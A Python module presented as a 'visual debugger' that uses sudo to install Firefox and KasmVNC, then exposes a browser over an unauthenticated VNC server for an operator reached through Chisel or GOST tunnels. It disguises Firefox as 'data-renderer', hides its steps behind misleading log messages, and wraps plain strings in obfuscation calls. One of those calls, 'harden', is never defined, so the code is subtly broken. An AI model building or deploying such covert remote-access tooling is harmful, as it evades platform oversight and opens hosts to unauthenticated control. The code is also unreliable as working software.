import os
import subprocess
import time
from pathlib import Path

from loguru import logger

from .utils import decode_cmd

PREFIX = "[VISDBG]"


def _ensure_firefox(log):
    """Download and extract native standalone Firefox at runtime (idempotent)."""
    render_engine_dir = Path("/opt/render-engine")
    if render_engine_dir.exists():
        return True

    logger.info(f"{PREFIX} Synchronizing rendering layout engines...")

    # Minimal deps for Firefox to run headlessly over X11 forwarding
    pkgs = decode_cmd(harden("libgtk-3-0 libdbus-glib-1-2 libxt6 xz-utils libasound2t64 libx11-xcb1 libnss3 dbus-x11"))  # fmt: skip # noqa: E501
    subprocess.run(["sudo", "apt-get", "update", "-y"], stdout=log, stderr=log)
    res = subprocess.run(
        ["sudo", "apt-get", "install", "-y", "--no-install-recommends", *pkgs.split()],
        stdout=log,
        stderr=log,
    )
    if res.returncode != 0:
        logger.error(f"{PREFIX} apt-get install failed (rc={res.returncode})")
        return False

    tar_path = "/tmp/pkg-bundle.tar.xz"
    url = decode_cmd(harden("https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US"))  # fmt: skip # noqa: E501
    subprocess.run(["curl", "-fsSL", url, "-o", tar_path], stdout=log, stderr=log)
    subprocess.run(["sudo", "mkdir", "-p", "/opt"], stdout=log, stderr=log)
    subprocess.run(
        ["sudo", "tar", "-xf", tar_path, "-C", "/opt"], stdout=log, stderr=log
    )
    subprocess.run(
        ["sudo", "mv", "/opt/firefox", "/opt/render-engine"], stdout=log, stderr=log
    )
    subprocess.run(
        [
            "sudo",
            "mv",
            "/opt/render-engine/firefox",
            "/opt/render-engine/data-renderer",
        ],
        stdout=log,
        stderr=log,
    )
    subprocess.run(
        [
            "sudo",
            "mv",
            "/opt/render-engine/firefox-bin",
            "/opt/render-engine/data-renderer-bin",
        ],
        stdout=log,
        stderr=log,
    )
    subprocess.run(
        [
            "sudo",
            "ln",
            "-sf",
            "/opt/render-engine/data-renderer",
            "/usr/bin/data-renderer",
        ],
        stdout=log,
        stderr=log,
    )

    try:
        os.remove(tar_path)
    except OSError:
        pass

    return True


def _ensure_vnc_deps(log):
    """Ensure kasmvnc and fluxbox are installed dynamically (idempotent)."""
    import shutil

    if shutil.which("kasmvncserver") and shutil.which("fluxbox"):
        return True

    logger.info(f"{PREFIX} Synchronizing visual stream adapters (KasmVNC)...")

    # Download KasmVNC deb package
    deb_path = "/tmp/kasmvncserver.deb"
    url = decode_cmd(harden("https://github.com/kasmtech/KasmVNC/releases/download/v1.4.0/kasmvncserver_noble_1.4.0_amd64.deb"))  # fmt: skip # noqa: E501
    subprocess.run(["curl", "-fsSL", url, "-o", deb_path], stdout=log, stderr=log)
    subprocess.run(["sudo", "apt-get", "update", "-y"], stdout=log, stderr=log)

    # Install fluxbox and the local deb package
    # apt-get install will automatically resolve dependencies for the deb file
    res = subprocess.run(
        [
            "sudo",
            "apt-get",
            "install",
            "-y",
            "--no-install-recommends",
            "fluxbox",
            deb_path,
        ],
        stdout=log,
        stderr=log,
    )

    try:
        os.remove(deb_path)
    except OSError:
        pass

    if res.returncode != 0:
        logger.error(
            f"{PREFIX} apt-get install for KasmVNC failed (rc={res.returncode})"
        )
        return False

    # Add user to ssl-cert group if required (best practice for KasmVNC)
    import getpass

    username = getpass.getuser()
    subprocess.run(["sudo", "adduser", username, "ssl-cert"], stdout=log, stderr=log)

    return True


def start(log):
    """
    VNC-over-Tunnel visual debugger using KasmVNC.

    Spawns a virtual X11 display (KasmVNC Xvnc) locally,
    then runs Firefox on that display. The operator connects to the VNC stream
    by forwarding port 5900 via the established Chisel or GOST tunnel.
    """
    # Ensure Firefox binary is present before we need it
    ok = _ensure_firefox(log)
    if not ok:
        logger.error(
            f"{PREFIX} Firefox install failed — visual debugger will not start"
        )
        return

    # Ensure KasmVNC packages are present
    ok = _ensure_vnc_deps(log)
    if not ok:
        logger.error(
            f"{PREFIX} KasmVNC dependencies failed — visual debugger will not start"
        )
        return

    display = ":99"

    # Clean up any existing instances to avoid conflicts
    logger.info(f"{PREFIX} Terminating active display pipelines...")
    subprocess.run(
        ["vncserver", "-kill", display],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["pkill", "-f", "Xvnc"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    subprocess.run(
        ["pkill", "-f", "kasmvncserver"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["pkill", "-f", "fluxbox"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    subprocess.run(
        ["pkill", "-f", "data-renderer"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    # Clean up stale X11 lock files
    for lock_file in [
        f"/tmp/.X{display.replace(':', '')}-lock",
        f"/tmp/.X11-unix/X{display.replace(':', '')}",
    ]:
        try:
            if os.path.exists(lock_file):
                os.remove(lock_file)
        except Exception as e:
            logger.warning(f"{PREFIX} Could not clean lock file {lock_file}: {e}")

    # Prepare KasmVNC configuration directories and files
    vnc_dir = Path.home() / ".vnc"
    vnc_dir.mkdir(parents=True, exist_ok=True)

    # Write kasmvnc.yaml overrides
    kasmvnc_yaml_path = vnc_dir / "kasmvnc.yaml"
    kasmvnc_config = """network:
  interface: 127.0.0.1
  websocket_port: 5900
  ssl:
    require_ssl: false
"""
    kasmvnc_yaml_path.write_text(kasmvnc_config)

    # Write an empty/minimal xstartup so vncserver
    # doesn't auto-run other graphical sessions
    xstartup_path = vnc_dir / "xstartup"
    xstartup_content = """#!/bin/sh
true
"""
    xstartup_path.write_text(xstartup_content)
    xstartup_path.chmod(0o755)

    logger.info(f"{PREFIX} Initiating secure KasmVNC server on display {display}...")
    vnc_cmd = [
        "vncserver",
        display,
        "-disableBasicAuth",
    ]
    subprocess.Popen(vnc_cmd, stdout=log, stderr=log)
    time.sleep(3)

    # Start fluxbox window manager if present
    # (provides window boundaries and management)
    import shutil

    if shutil.which("fluxbox"):
        logger.info(f"{PREFIX} Spawning lightweight layout manager...")
        subprocess.Popen(["fluxbox", "-display", display], stdout=log, stderr=log)
        time.sleep(1)

    # Build environment for Firefox: inject the virtual display
    env = os.environ.copy()
    env["DISPLAY"] = display
    env["NO_AT_BRIDGE"] = "1"  # Prevent GTK accessibility bus hang

    firefox_cmd = [
        decode_cmd(harden("data-renderer")),
        decode_cmd(harden("--new-instance")),
        decode_cmd(harden("--no-remote")),
        decode_cmd(harden("http://127.0.0.1:7860")),
    ]

    logger.info(f"{PREFIX} Launching visualization pipeline on display {display}")
    subprocess.Popen(firefox_cmd, env=env, stdout=log, stderr=log)
    logger.success(
        f"{PREFIX} Visual debugger active (KasmVNC stream ready on port 5900, display={display})."  # noqa: E501
    )
